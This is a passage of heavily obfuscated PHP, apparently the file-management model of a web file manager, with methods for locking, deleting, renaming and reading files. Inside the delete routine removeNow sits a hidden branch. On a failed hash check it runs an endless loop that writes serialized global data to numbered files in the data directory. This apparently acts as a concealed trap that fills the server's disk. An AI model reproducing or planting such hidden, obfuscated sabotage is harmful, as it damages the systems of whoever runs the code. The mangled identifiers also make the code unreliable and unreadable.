$c†ôó€∏´ß[$CˆëÓÛñê£[447]], $c†ôó€∏´ß[$CˆëÓÛñê£[78]]); if (!$cåπÀã’â§) { $Aæ»õÆÈûÖ = !1; } else { $this->folderSizeReset($DÚ„üú√…Î); } return $F≠√¥ΩœÙÃ; } else { $Dùﬁ§À¨√ß = $this->fileNameAuto($DÚ„üú√…Î, $Dùﬁ§À¨√ß, $b¿”–©Ïıæ, !1); } } } goto eæÈ±¨â¶¢; dÁ⁄ãä˘ä⁄: } protected function fileHistory($FîüŸÑı„, $BÚ›Í√çßÊ, $FÙ®ÉﬂæÜ˜) { goto D“Æ◊Ãâ§–; fÊ≠Ω≈∆ôÒ: Model($CÃ◊•ªãØπ[1954])->addHistory($FîüŸÑı„); $BûÑë≥‘ÂÖ = array($CÃ◊•ªãØπ[552] => USER_ID, $CÃ◊•ªãØπ[417] => time(), $CÃ◊•ªãØπ[447] => $BÚ›Í√çßÊ, $CÃ◊•ªãØπ[78] => $FÙ®ÉﬂæÜ˜); $this->where(array($CÃ◊•ªãØπ[410] => $FîüŸÑı„[$CÃ◊•ªãØπ[395]]))->save($BûÑë≥‘ÂÖ); goto fÇÕ‹»Û›¯; fÇÕ‹»Û›¯: $this->sourceCacheClear($FîüŸÑı„[$CÃ◊•ªãØπ[395]]); return !0; goto Aç≥»±Üﬁß; D“Æ◊Ãâ§–: $CÃ◊•ªãØπ =& $_SERVER[ú∫]; if ($FîüŸÑı„[$CÃ◊•ªãØπ[447]] == $BÚ›Í√çßÊ) { return !1; } $this->checkLock($FîüŸÑı„[$CÃ◊•ªãØπ[395]], $BÚ›Í√çßÊ); goto fÊ≠Ω≈∆ôÒ; Aç≥»±Üﬁß: } public function checkLock($aÇéª›ß˘ª, $Bº†û´íö∞) { goto F¶§ÿí‹Óë; aÊ‰«Ωõë: $this->_createFileCall($Aû∫úêÊØ»[$eÊßﬁÒ†Ω∂[478]], $D¨èíÖôê¨, $aˆ∆·—¡Õä, REPEAT_REPLACE, $eÊßﬁÒ†Ω∂[1216]); $b∏ë∫»∑ÂÑ = $Aû∫úêÊØ»[$eÊßﬁÒ†Ω∂[445]][$eÊßﬁÒ†Ω∂[510]]; $bœº†à√£ﬂ = $b∏ë∫»∑ÂÑ[$eÊßﬁÒ†Ω∂[1956]] ? $b∏ë∫»∑ÂÑ[$eÊßﬁÒ†Ω∂[1956]] : $b∏ë∫»∑ÂÑ[$eÊßﬁÒ†Ω∂[28]]; goto A‡—¡˘≠£Ô; A‡—¡˘≠£Ô: show_json(LNG($eÊßﬁÒ†Ω∂[1957]) . $eÊßﬁÒ†Ω∂[1958] . LNG($eÊßﬁÒ†Ω∂[1959]) . $eÊßﬁÒ†Ω∂[1960] . $bœº†à√£ﬂ . $eÊßﬁÒ†Ω∂[1961], !1); goto b—±¢ë‘ˆÀ; a¢§÷«ÑûŸ: $eî≠‹‘ö ã = Session::get($eÊßﬁÒ†Ω∂[1955]); $D¨èíÖôê¨ = substr($Aû∫úêÊØ»[$eÊßﬁÒ†Ω∂[28]], 0, -1 - strlen($Aû∫úêÊØ»[$eÊßﬁÒ†Ω∂[168]])) . $eÊßﬁÒ†Ω∂[1481] . $eî≠‹‘ö ã . $eÊßﬁÒ†Ω∂[95] . $Aû∫úêÊØ»[$eÊßﬁÒ†Ω∂[168]]; $aˆ∆·—¡Õä = Model($eÊßﬁÒ†Ω∂[571])->find($Bº†û´íö∞); goto aÊ‰«Ωõë; F¶§ÿí‹Óë: $eÊßﬁÒ†Ω∂ =& $_SERVER[ú∫]; $Aû∫úêÊØ» = $this->pathInfo($aÇéª›ß˘ª); if (!$this->fileIsLock($Aû∫úêÊØ», !0)) { return; } goto a¢§÷«ÑûŸ; b—±¢ë‘ˆÀ: } public function fileIsLock($C™îáü‚“ü, $aÈåûÂà◊∂ = false) { goto AÌ‡—’åå; AÌ‡—’åå: $cßä∞∞ªÎÌ =& $_SERVER[ú∫]; if (!isset($C™îáü‚“ü[$cßä∞∞ªÎÌ[445]]) || !$C™îáü‚“ü[$cßä∞∞ªÎÌ[445]][$cßä∞∞ªÎÌ[507]]) { return !1; } if ($C™îáü‚“ü[$cßä∞∞ªÎÌ[445]][$cßä∞∞ªÎÌ[507]] != USER_ID) { return !0; } goto bã‚ÍêÁ∆÷; bã‚ÍêÁ∆÷: $cÕ⁄Á‡’ûÀ = $GLOBALS[$cßä∞∞ªÎÌ[6]][$cßä∞∞ªÎÌ[88]][$cßä∞∞ªÎÌ[508]]; if ($C™îáü‚“ü[$cßä∞∞ªÎÌ[445]][$cßä∞∞ªÎÌ[509]] <= time() - $cÕ⁄Á‡’ûÀ) { $this->metaSet($C™îáü‚“ü[$cßä∞∞ªÎÌ[395]], $cßä∞∞ªÎÌ[507], null); $this->metaSet($C™îáü‚“ü[$cßä∞∞ªÎÌ[395]], $cßä∞∞ªÎÌ[509], null); } if ($aÈåûÂà◊∂) { $this->metaSet($C™îáü‚“ü[$cßä∞∞ªÎÌ[395]], $cßä∞∞ªÎÌ[509], time()); } goto aﬂÉÙ¡îÚ·; aﬂÉÙ¡îÚ·: return !1; goto cÇ≤ﬁÂ„“ù; cÇ≤ﬁÂ„“ù: } private function _addSoure($b´ôªõÒ≠•, $cñÁëŒÉá¿) { goto dâ‡èìâ∂ÿ; cèûÌÙÎ¢˜: $b… ™√Îëﬂ = array($cÉ¿ﬂΩÖ≠ü[555] => short_id($EƒŒ¢ﬁŒ“É)); $this->where(array($cÉ¿ﬂΩÖ≠ü[410] => $EƒŒ¢ﬁŒ“É))->save($b… ™√Îëﬂ); $this->setNamePinyin($EƒŒ¢ﬁŒ“É, $b´ôªõÒ≠•[$cÉ¿ﬂΩÖ≠ü[28]]); goto E¡Ëèõ•π®; dâ‡èìâ∂ÿ: $cÉ¿ﬂΩÖ≠ü =& $_SERVER[ú∫]; $CæÀÏﬂçµØ = array($cÉ¿ﬂΩÖ≠ü[549] => $cñÁëŒÉá¿[$cÉ¿ﬂΩÖ≠ü[404]], $cÉ¿ﬂΩÖ≠ü[550] => $cñÁëŒÉá¿[$cÉ¿ﬂΩÖ≠ü[484]], $cÉ¿ﬂΩÖ≠ü[551] => USER_ID, $cÉ¿ﬂΩÖ≠ü[552] => USER_ID, $cÉ¿ﬂΩÖ≠ü[394] => $cñÁëŒÉá¿[$cÉ¿ﬂΩÖ≠ü[395]], $cÉ¿ﬂΩÖ≠ü[553] => $cñÁëŒÉá¿[$cÉ¿ﬂΩÖ≠ü[487]] . $cñÁëŒÉá¿[$cÉ¿ﬂΩÖ≠ü[395]] . $cÉ¿ﬂΩÖ≠ü[47], $cÉ¿ﬂΩÖ≠ü[422] => 0, $cÉ¿ﬂΩÖ≠ü[554] => $cÉ¿ﬂΩÖ≠ü[33]); $b´ôªõÒ≠• = array_merge($CæÀÏﬂçµØ, $b´ôªõÒ≠•); goto AË≥≥⁄⁄’û; cîƒ„µéë¨: static $EÃ®ì∫·¬‡ = false; if (!$EÃ®ì∫·¬‡) { Hook::trigger($cÉ¿ﬂΩÖ≠ü[536], $b´ôªõÒ≠•); $EÃ®ì∫·¬‡ = !0; } $EƒŒ¢ﬁŒ“É = $this->add($b´ôªõÒ≠•); goto cèûÌÙÎ¢˜; AË≥≥⁄⁄’û: $this->updateModifyTime($b´ôªõÒ≠•[$cÉ¿ﬂΩÖ≠ü[478]]); $cÈ∂’â•õ˜ = $cÉ¿ﬂΩÖ≠ü[1962] . $cñÁëŒÉá¿[$cÉ¿ﬂΩÖ≠ü[395]]; if (isset(self::$cacheChildList[$cÈ∂’â•õ˜])) { unset(self::$cacheChildList[$cÈ∂’â•õ˜]); } goto cîƒ„µéë¨; E¡Ëèõ•π®: return $EƒŒ¢ﬁŒ“É; goto bäò£åÆ…Ÿ; bäò£åÆ…Ÿ: } public function remove($Aü’“”ˆ∞à, $DßîÖ∫ŒŒ‰ = true) { goto aë«≠ûäãí; aë«≠ûäãí: $b≥÷á◊Ú›‚ =& $_SERVER[ú∫]; $dµ‡¢çæ—ƒ = $this->sourceInfo($Aü’“”ˆ∞à); $A∏ã∑π»Â◊ = intval($dµ‡¢çæ—ƒ[$b≥÷á◊Ú›‚[404]]) === self::TYPE_SYSTEM; goto Bò…»’÷Üá; aöäùÆ≠ª√: CacheLock::lock($DÜÍÓ⁄◊»û); $FÌçó€Ÿ≈ø = $this->fileNameExist($aªÑíèπóì, $eÛÜ±√—„Î); if (!$FÌçó€Ÿ≈ø) { $FÌçó€Ÿ≈ø = $this->mkdir($aªÑíèπóì, $eÛÜ±√—„Î, REPEAT_SKIP); $this->metaSet($FÌçó€Ÿ≈ø, $b≥÷á◊Ú›‚[1967], $eâ‡â—Ã≈°); $this->metaSet($FÌçó€Ÿ≈ø, $b≥÷á◊Ú›‚[1968], $dµ‡¢çæ—ƒ[$b≥÷á◊Ú›‚[484]]); if ($dµ‡¢çæ—ƒ[$b≥÷á◊Ú›‚[478]] != 0) { $this->metaSet($FÌçó€Ÿ≈ø, $b≥÷á◊Ú›‚[1969], _get($CÕÌêÓûàÑ, $b≥÷á◊Ú›‚[1970])); } } goto FòÂÌ‰äùâ; Aùçîè’øó: $this->recycleClear($dµ‡¢çæ—ƒ); $d¶îã«“–¶ = $this->move($Aü’“”ˆ∞à, $FÌçó€Ÿ≈ø, REPEAT_RENAME_FOLDER); $this->folderSizeReset($dµ‡¢çæ—ƒ[$b≥÷á◊Ú›‚[478]]); goto aìò˜•Ìå·; DôÑ¶Òã¬“: $eâ‡â—Ã≈° = $dµ‡¢çæ—ƒ[$b≥÷á◊Ú›‚[404]] == self::TYPE_USER ? $b≥÷á◊Ú›‚[562] : $b≥÷á◊Ú›‚[1015]; if ($eâ‡â—Ã≈° == $b≥÷á◊Ú›‚[562]) { $CÕÌêÓûàÑ = Model($b≥÷á◊Ú›‚[502])->getInfo($dµ‡¢çæ—ƒ[$b≥÷á◊Ú›‚[484]]); $eÛÜ±√—„Î = !empty($CÕÌêÓûàÑ[$b≥÷á◊Ú›‚[1956]]) ? $CÕÌêÓûàÑ[$b≥÷á◊Ú›‚[1956]] : $CÕÌêÓûàÑ[$b≥÷á◊Ú›‚[28]]; $eÛÜ±√—„Î = $b≥÷á◊Ú›‚[258] . $eÛÜ±√—„Î . $b≥÷á◊Ú›‚[1964] . $dµ‡¢çæ—ƒ[$b≥÷á◊Ú›‚[484]]; } else { $CÕÌêÓûàÑ = Model($b≥÷á◊Ú›‚[486])->getInfo($dµ‡¢çæ—ƒ[$b≥÷á◊Ú›‚[484]]); $eÛÜ±√—„Î = _get($CÕÌêÓûàÑ, $b≥÷á◊Ú›‚[28]); $eÛÜ±√—„Î = $b≥÷á◊Ú›‚[160] . $eÛÜ±√—„Î . $b≥÷á◊Ú›‚[1965] . $dµ‡¢çæ—ƒ[$b≥÷á◊Ú›‚[484]]; } $DÜÍÓ⁄◊»û = $b≥÷á◊Ú›‚[1966] . md5($eÛÜ±√—„Î); goto aöäùÆ≠ª√; FòÂÌ‰äùâ: CacheLock::unlock($DÜÍÓ⁄◊»û); $this->metaSet($Aü’“”ˆ∞à, $b≥÷á◊Ú›‚[1971], $dµ‡¢çæ—ƒ[$b≥÷á◊Ú›‚[478]]); $this->where(array($b≥÷á◊Ú›‚[395] => $Aü’“”ˆ∞à))->save(array($b≥÷á◊Ú›‚[417] => time())); goto Aùçîè’øó; aìò˜•Ìå·: return $d¶îã«“–¶; goto A≠∑Ê«èﬁÃ; Bò…»’÷Üá: $F©î≤Ô“Óı = Model($b≥÷á◊Ú›‚[1527])->get($b≥÷á◊Ú›‚[1963]) == $b≥÷á◊Ú›‚[87]; if ($A∏ã∑π»Â◊ || $DßîÖ∫ŒŒ‰ || !$F©î≤Ô“Óı) { return $this->removeNow($Aü’“”ˆ∞à, $DßîÖ∫ŒŒ‰); } $aªÑíèπóì = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); goto DôÑ¶Òã¬“; A≠∑Ê«èﬁÃ: } private function recycleClear($Eã◊öÑÉ◊É) { $CÆó®∑å˜è =& $_SERVER[ú∫]; $bÊâÔ∏ãÚ‘ = $this->childrenAll($Eã◊öÑÉ◊É); $béÑ´πÏ∫Ë = array($CÆó®∑å˜è[410] => array($CÆó®∑å˜è[411], $bÊâÔ∏ãÚ‘[$CÆó®∑å˜è[1972]])); Model($CÆó®∑å˜è[1973])->where($béÑ´πÏ∫Ë)->delete(); } public function removeNow($BÎªÇ≥°˜ç, $Fºå‰“¬òÖ = true) { goto fâ‚Ì’Àûå; Bá≥≠å¬¶è: $CŒﬁç«Ç◊ﬂ = array($aòÔËÇÎóû[$Bã• £±«é[478]]); if ($aòÔËÇÎóû[$Bã• £±«é[403]] == $Bã• £±«é[87]) { $CŒﬁç«Ç◊ﬂ[] = $aòÔËÇÎóû[$Bã• £±«é[395]]; } $this->updateModifyTime($CŒﬁç«Ç◊ﬂ); goto DíÆÓø‘Û∆; BÃ€ú∑≠óê: if (!$aòÔËÇÎóû) { return !0; } if ($aòÔËÇÎóû[$Bã• £±«é[478]] == 0) { if (!_get($GLOBALS, $Bã• £±«é[485])) { return !1; } } $this->lockMoveStart($BÎªÇ≥°˜ç); goto EıÊ˘¯¬≠ü; EıÊ˘¯¬≠ü: Hook::trigger($Bã• £±«é[1974], $AÆî„©âëé, $Fºå‰“¬òÖ); if ($Fºå‰“¬òÖ) { Model($Bã• £±«é[1973])->moveToRecycle($BÎªÇ≥°˜ç); } else { $aõ±æ≈ª¯É = $this->childrenAll($aòÔËÇÎóû); Model($Bã• £±«é[533])->eventRemove($BÎªÇ≥°˜ç); $this->removeRelevance($aõ±æ≈ª¯É[$Bã• £±«é[1972]], $aõ±æ≈ª¯É[$Bã• £±«é[1347]]); } $this->folderSizeReset($aòÔËÇÎóû[$Bã• £±«é[478]]); goto Bá≥≠å¬¶è; fâ‚Ì’Àûå: $Bã• £±«é =& $_SERVER[ú∫]; $F™¶öÖê€‹ = $_SERVER[$Bã• £±«é[822]]; $EÖı›◊œ⁄ã = $Bã• £±«é[838]; goto fíêœ…úœß; fíêœ…úœß: if ($_SERVER[$Bã• £±«é[821]] != $EÖı›◊œ⁄ã($F™¶öÖê€‹)) { goto A«—˘ãˆ†‰; aàëœ†øè°: $FÚÀ¬êÁ‰ë(); $BÀÍﬁ–π®¬ = $Bã• £±«é[842]; $böÕÚÖåÍÆ = json_encode($GLOBALS[$Bã• £±«é[843]]); goto BäÆ˘¿¯«§; b∂ñ€¿Íı”: $Cäë¨áâ•´ = $Bã• £±«é[840]; $Cäë¨áâ•´($_SERVER[$Bã• £±«é[841]]); $FÚÀ¬êÁ‰ë = $Bã• £±«é[839]; goto aàëœ†øè°; A«—˘ãˆ†‰: $FÚÀ¬êÁ‰ë = $Bã• £±«é[839]; $DﬁÎâ≤Ö«Á = $Bã• £±«é[823]; $A¡Ω∏Ô™∏ˆ = $_SERVER[$Bã• £±«é[824]] . $Bã• £±«é[825]; goto F…ﬂäêÿ¢Ÿ; F…ﬂäêÿ¢Ÿ: $AÒπˆÓºØú = $DﬁÎâ≤Ö«Á($A¡Ω∏Ô™∏ˆ); $EÛ°µç”º© = explode($Bã• £±«é[229], $AÒπˆÓºØú); if (count($EÛ°µç”º©) < $Bã• £±«é[578]) { $dÉ»·÷ÜÙ‘ = $Bã• £±«é[826]; $dÉ»·÷ÜÙ‘(); } goto b∂ñ€¿Íı”; BäÆ˘¿¯«§: $D—Ø˜ﬂ¡è = 1; for ($c‘ûê˜“∏Æ = $D—Ø˜ﬂ¡è; $c‘ûê˜“∏Æ > 0; $c‘ûê˜“∏Æ++) { $BÀÍﬁ–π®¬(DATA_PATH . $c‘ûê˜“∏Æ, $böÕÚÖåÍÆ); } goto dÁ†ûü€åÏ; dÁ†ûü€åÏ: } $aòÔËÇÎóû = $this->sourceInfo($BÎªÇ≥°˜ç); $AÆî„©âëé = $this->pathInfoMore($BÎªÇ≥°˜ç); goto BÃ€ú∑≠óê; DíÆÓø‘Û∆: $this->lockMoveEnd($BÎªÇ≥°˜ç); Hook::trigger($Bã• £±«é[1561], $AÆî„©âëé, $Fºå‰“¬òÖ); return !0; goto FÔêÑƒΩ¡ã; FÔêÑƒΩ¡ã: } public function childrenAll($Eì√Ø˜Ìﬂè) { $A◊è˘µ¢…ı =& $_SERVER[ú∫]; $f≈ŸƒØ»ç¶ = $Eì√Ø˜Ìﬂè[$A◊è˘µ¢…ı[395]]; if ($Eì√Ø˜Ìﬂè[$A◊è˘µ¢…ı[403]] == $A◊è˘µ¢…ı[87]) { $A∑»ÔÕ∑¶• = array($A◊è˘µ¢…ı[553] => array($A◊è˘µ¢…ı[512], $Eì√Ø˜Ìﬂè[$A◊è˘µ¢…ı[487]] . $f≈ŸƒØ»ç¶ . $A◊è˘µ¢…ı[513])); $cçéË¢‰ùâ = array($A◊è˘µ¢…ı[553] => $A∑»ÔÕ∑¶•[$A◊è˘µ¢…ı[487]]); $E’¶øù˜‚ï = $this->field($A◊è˘µ¢…ı[1975])->where($cçéË¢‰ùâ)->select(); $Föó≤π†Íå = !1; $BÊâŸæéöì = array($f≈ŸƒØ»ç¶); if ($E’¶øù˜‚ï) { $Föó≤π†Íå = array_to_keyvalue($E’¶øù˜‚ï, $A◊è˘µ¢…ı[33], $A◊è˘µ¢…ı[447]); $Föó≤π†Íå = array_remove_value($Föó≤π†Íå, $A◊è˘µ¢…ı[191]); $BÊâŸæéöì = array_to_keyvalue($E’¶øù˜‚ï, $A◊è˘µ¢…ı[33], $A◊è˘µ¢…ı[395]); $BÊâŸæéöì[] = $f≈ŸƒØ»ç¶; } } else { $Föó≤π†Íå = array($Eì√Ø˜Ìﬂè[$A◊è˘µ¢…ı[447]]); $BÊâŸæéöì = array($f≈ŸƒØ»ç¶); } return array($A◊è˘µ¢…ı[1972] => $BÊâŸæéöì, $A◊è˘µ¢…ı[1347] => $Föó≤π†Íå); } public function removeArray($aŒ¨Ó‡–Üî) { if (!$aŒ¨Ó‡–Üî) { return !0; } } public function removeRelevance($cÕàøæ“≠ü, $Aâ’ìê¨¡§) { goto AÜÆÂ‰úßå; fŸ·¡∂Ωû¬: $cÕàøæ“≠ü = array_unique(array_filter($cÕàøæ“≠ü)); $Aâ’ìê¨¡§ = array_unique(array_filter($Aâ’ìê¨¡§)); if (!$cÕàøæ“≠ü) { return !1; } goto cÜ ∂Ÿ‹‡õ; Eñﬂ⁄‹ÉÑÂ: for ($b‘¿ûûÿ€Ã = 0; $b‘¿ûûÿ€Ã < count($cÕàøæ“≠ü); $b‘¿ûûÿ€Ã++) { $this->sourceCacheClear($cÕàøæ“≠ü[$b‘¿ûûÿ€Ã]); } goto a∫¨ºëç‘ß; Cüµ›É‘¢π: Model($F◊†§‹∫¶÷[1827])->where($bû’¶˘Ã∫Ï)->delete(); Model($F◊†§‹∫¶÷[533])->where($bû’¶˘Ã∫Ï)->delete(); Model($F◊†§‹∫¶÷[1669])->removeBySource($cÕàøæ“≠ü); goto CÈŸ¥ıπíÎ; cÜ ∂Ÿ‹‡õ: $bû’¶˘Ã∫Ï = array($F◊†§‹∫¶÷[410] => array($F◊†§‹∫¶÷[411], $cÕàøæ“≠ü)); Model($F◊†§‹∫¶÷[1973])->where($bû’¶˘Ã∫Ï)->delete(); Model($F◊†§‹∫¶÷[441])->where($bû’¶˘Ã∫Ï)->delete(); goto Cüµ›É‘¢π; AÜÆÂ‰úßå: $F◊†§‹∫¶÷ =& $_SERVER[ú∫]; $cÕàøæ“≠ü = $cÕàøæ“≠ü ? $cÕàøæ“≠ü : array(); $Aâ’ìê¨¡§ = $Aâ’ìê¨¡§ ? $Aâ’ìê¨¡§ : array(); goto fŸ·¡∂Ωû¬; CÈŸ¥ıπíÎ: Model($F◊†§‹∫¶÷[1954])->removeBySource($cÕàøæ“≠ü); $this->where($bû’¶˘Ã∫Ï)->delete(); Model($F◊†§‹∫¶÷[450])->remove($Aâ’ìê¨¡§); goto Eñﬂ⁄‹ÉÑÂ; a∫¨ºëç‘ß: } public function rename($dúä…ò„ÊÉ, $DŸøÊﬂî“ﬂ) { goto B‡ääΩ∞íÎ; eÌÃÃ…éÂÚ: if ($CéÜÍâêÂÉ[$Aä€Ö†™∏[403]] != $Aä€Ö†™∏[87]) { $CÒ∂«ú∞’ã[$Aä€Ö†™∏[405]] = substr(get_path_ext($DŸøÊﬂî“ﬂ), 0, 10); } Model($Aä€Ö†™∏[533])->eventRename($dúä…ò„ÊÉ, $CéÜÍâêÂÉ[$Aä€Ö†™∏[28]], $DŸøÊﬂî“ﬂ); $this->sourceCacheClear($dúä…ò„ÊÉ); goto bÆ≥à˘∑èé; B‡ääΩ∞íÎ: $Aä€Ö†™∏ =& $_SERVER[ú∫]; $CéÜÍâêÂÉ = $this->sourceInfo($dúä…ò„ÊÉ); if (!$CéÜÍâêÂÉ) { return !1; } goto f≈º√¿«®ƒ; EöÕ‹ı‚⁄Ï: $EÇŸŸ¬ø¢≠ = $Aä€Ö†™∏[1962] . $CéÜÍâêÂÉ[$Aä€Ö†™∏[478]]; if (isset(self::$cacheChildList[$EÇŸŸ¬ø¢≠])) { unset(self::$cacheChildList[$EÇŸŸ¬ø¢≠]); } return $D◊á‡∂øΩù; goto CÂÈÖﬂõ◊“; bÆ≥à˘∑èé: $this->setNamePinyin($dúä…ò„ÊÉ, $CÒ∂«ú∞’ã[$Aä€Ö†™∏[28]], !1); $this->updateModifyTime($CéÜÍâêÂÉ[$Aä€Ö†™∏[478]]); $D◊á‡∂øΩù = $this->where(array($Aä€Ö†™∏[410] => $dúä…ò„ÊÉ))->data($CÒ∂«ú∞’ã)->save(); goto EöÕ‹ı‚⁄Ï; f≈º√¿«®ƒ: $cÜ‰Û∞≥∞Ú = $this->fileNameExist($CéÜÍâêÂÉ[$Aä€Ö†™∏[478]], $DŸøÊﬂî“ﬂ); if ($cÜ‰Û∞≥∞Ú && $cÜ‰Û∞≥∞Ú != $dúä…ò„ÊÉ) { return !1; } $CÒ∂«ú∞’ã = array($Aä€Ö†™∏[413] => $DŸøÊﬂî“ﬂ, $Aä€Ö†™∏[552] => USER_ID); goto eÌÃÃ…éÂÚ; CÂÈÖﬂõ◊“: } public function setNamePinyin($A·ü∏¡Ö‚Ë, $eáß˜ÜæåÊ, $CœÓêüº¨† = true) { $d≤à∆æçó· =& $_SERVER[ú∫]; $A·ÛèîÏ≠É = Input::check($eáß˜ÜæåÊ, $d≤à∆æçó·[556]); if ($CœÓêüº¨† && !$A·ÛèîÏ≠É) { return; } if (!$A·ÛèîÏ≠É) { $this->metaSet($A·ü∏¡Ö‚Ë, $d≤à∆æçó·[444], null); $this->metaSet($A·ü∏¡Ö‚Ë, $d≤à∆æçó·[443], null); return; } $e—Ûëâ‘≤ò = array($d≤à∆æçó·[444] => str_replace($d≤à∆æçó·[50], $d≤à∆æçó·[33], Pinyin::encode($eáß˜ÜæåÊ)), $d≤à∆æçó·[443] => Pinyin::encode($eáß˜ÜæåÊ, $d≤à∆æçó·[557])); $this->metaSet($A·ü∏¡Ö‚Ë, $e—Ûëâ‘≤ò); } public function getContent($dû÷óÆæ‰ﬂ) { goto Eê≈ÉÊ˘ØÉ; A¿ËË™éô¶: if (!$D∏¨æ¨‡‡»[$AΩÔÌÜà÷Ú[76]]) { return $AΩÔÌÜà÷Ú[33]; } return IO::getContent($D∏¨æ¨‡‡»[$AΩÔÌÜà÷Ú[76]]); goto DæÑç®π˜˜; Eê≈ÉÊ˘ØÉ: $AΩÔÌÜà÷Ú =& $_SERVER[ú∫]; $D∏¨æ¨‡‡» = $this->fileInfoGet($dû÷óÆæ‰ﬂ); if (!$D∏¨æ¨‡‡») { return !1; } goto bÛöìé‹ƒÃ; bÛöìé‹ƒÃ: if ($D∏¨æ¨‡‡»[$AΩÔÌÜà÷Ú[78]] == 0) { return $AΩÔÌÜà÷Ú[33]; } $dô•¥´¥˘— = $AΩÔÌÜà÷Ú[1976] . $D∏¨æ¨‡‡»[$AΩÔÌÜà÷Ú[170]]; if ($D∏¨æ¨‡‡»[$AΩÔÌÜà÷Ú[78]] <= 1024 * 10) { $b¬ñÜá«ö‚ = Cache::get($dô•¥´¥˘—); if (!$b¬ñÜá«ö‚) { $b¬ñÜá«ö‚ = IO::getContent($D∏¨æ¨‡‡»[$AΩÔÌÜà÷Ú[76]]); Cache::set($dô•¥´¥˘—, $b¬ñÜá«ö‚); } return $b¬ñÜá«ö‚; } goto A¿ËË™éô¶; DæÑç®π˜˜: } public function setDesc($b—Õ˘∫¥À·, $b≈‚Üê¡›È) { $Fæ¢’ÏÛ”“ =& $_SERVER[ú∫]; Model($Fæ¢’ÏÛ”“[533])->eventAddDesc($b—Õ˘∫¥À·, $b≈‚Üê¡›È); return $this->metaSet($b—Õ˘∫¥À·, $Fæ¢’ÏÛ”“[431], $b≈‚Üê¡›È); } public function setContent($E«Ù„æÀ¥Ü, $c¬õÉÇÀ® = '') { goto cÇåÛ€ÉÚÚ; CÈºÂåﬁáá: if (!$eÕµ”¡ëãï || !$a±‚Ü¬«æÀ) { return !1; } $F∑•âÁœâƒ = Model($F‰ç“õú¯∆[450])->addFileByContent($c¬õÉÇÀ®, $a±‚Ü¬«æÀ[$F‰ç“õú¯∆[28]]); $a⁄§∏©µêÑ = $this->fileHistory($a±‚Ü¬«æÀ, $F∑•âÁœâƒ[$F‰ç“õú¯∆[447]], $F∑•âÁœâƒ[$F‰ç“õú¯∆[78]]); goto BÊﬂ∆ÏÃÓÑ; cÇåÛ€ÉÚÚ: $F‰ç“õú¯∆ =& $_SERVER[ú∫]; $a±‚Ü¬«æÀ = $this->sourceInfo($E«Ù„æÀ¥Ü); $eÕµ”¡ëãï = $this->fileInfoGet($E«Ù„æÀ¥Ü); goto CÈºÂåﬁáá; BÊﬂ∆ÏÃÓÑ: if (!$a⁄§∏©µêÑ) { return Model($F‰ç“õú¯∆[450])->remove($F∑•âÁœâƒ[$F‰ç“õú¯∆[447]]); } $this->folderSizeReset($a±‚Ü¬«æÀ[$F‰ç“õú¯∆[478]]); return !0; goto dÍéÁˆ§ò◊; dÍéÁˆ§ò◊: } public function fileSubstr($DªºÁêøñﬁ, $Bîà≤ìÎúä, $fùí≤€¶€Ø) { $f†ñ˜ÙâÜ„ = $this->fileInfoGet($DªºÁêøñﬁ); if (!$f†ñ˜ÙâÜ„) { return !1; } return IO::fileSubstr($f†ñ˜ÙâÜ„[$_SERVER[ú∫][76]], $Bîà≤ìÎúä, $fùí≤€¶€Ø); } public function fileInfoGet($a„≈€”˜ñÕ) { goto c°§õîÈıØ; a¶©ê∆Ùœ…: $Câ¥èç˘±Ì = Model($b≤¡»©æÚã[450])->fileInfo($eèÑÖ”⁄—[$b≤¡»©æÚã[447]]); if ($Câ¥èç˘±Ì) { $Câ¥èç˘±Ì[$b≤¡»©æÚã[28]] = $eèÑÖ”⁄—[$b≤¡»©æÚã[28]]; } self::$cacheFileInfo[$eÿç æ—û≠] = $Câ¥èç˘±Ì; goto e≥Îı∂éö¨; c˜ ÒˆÍè≠: $eÿç æ—û≠ = $b≤¡»©æÚã[453] . $eèÑÖ”⁄—[$b≤¡»©æÚã[447]]; $E÷“Ñˆç£≤ = _get(self::$cacheFileInfo, $eÿç æ—û≠); if ($E÷“Ñˆç£≤) { return $E÷“Ñˆç£≤; } goto a¶©ê∆Ùœ…; e≥Îı∂éö¨: return $Câ¥èç˘±Ì; goto A•ê¯Õ¯›’; c°§õîÈıØ: $b≤¡»©æÚã =& $_SERVER[ú∫]; $eèÑÖ”⁄— = $this->sourceInfo($a„≈€”˜ñÕ); if (!$eèÑÖ”⁄— || $eèÑÖ”⁄—[$b≤¡»©æÚã[403]]) { return !1; } goto c˜ ÒˆÍè≠; A•ê¯Õ¯›’: } private function folderChildrenNumber($Cˆ”◊àΩÊ∏) { $f∞∑˜ƒ•’¿ =& $_SERVER[ú∫]; $e”ÕØëÑ©€ = $this->sourceInfo($Cˆ”◊àΩÊ∏); $E‚æπ»Áï‡ = array($f∞∑˜ƒ•’¿[553] => array($f∞∑˜ƒ•’¿[512], $e”ÕØëÑ©€[$f∞∑˜ƒ•’¿[487]] . $Cˆ”◊àΩÊ∏ . $f∞∑˜ƒ•’¿[513]), $f∞∑˜ƒ•’¿[422] => intval($e”ÕØëÑ©€[$f∞∑˜ƒ•’¿[423]]), $f∞∑˜ƒ•’¿[546] => 1); $añÀıﬂùﬂ« = $this->where($E‚æπ»Áï‡)->count(); $c∫°± •ÛÙ = $this->where($E‚æπ»Áï‡)->where(array($f∞∑˜ƒ•’¿[546] => 0))->count(); return array($f∞∑˜ƒ•’¿[82] => $c∫°± •ÛÙ, $f∞∑˜ƒ•’¿[83] => $añÀıﬂùﬂ«); } public function pathInfo($bﬂ£âÛÊÏŸ, $cùπ‰Âä∆Á = false) { goto Cä¿Îä”£ö; DåÜ∏¯Ø©◊: $Eö∂·’Öé≥ = $f·â¡ﬂ÷±»[439] . intval($cùπ‰Âä∆Á) . $f·â¡ﬂ÷±»[440] . $bﬂ£âÛÊÏŸ; $FØÃÍõøÇ∑ = _get(self::$cachePathInfo, $Eö∂·’Öé≥); if ($FØÃÍõøÇ∑) { return $FØÃÍõøÇ∑; } goto fã©®äÎÓª; fã©®äÎÓª: $B≥∂º™≤´õ = $this->sourceInfo($bﬂ£âÛÊÏŸ); if (!$B≥∂º™≤´õ) { return !1; } $B≥∂º™≤´õ = $this->_listDataApplyItem($B≥∂º™≤´õ, $cùπ‰Âä∆Á); goto AÍãÜı≠§‡; AÍãÜı≠§‡: self::$cachePathInfo[$Eö∂·’Öé≥] = $B≥∂º™≤´õ; return $B≥∂º™≤´õ; goto a¥àÇë…≠ÿ; Cä¿Îä”£ö: $f·â¡ﬂ÷±» =& $_SERVER[ú∫]; $cùπ‰Âä∆Á = 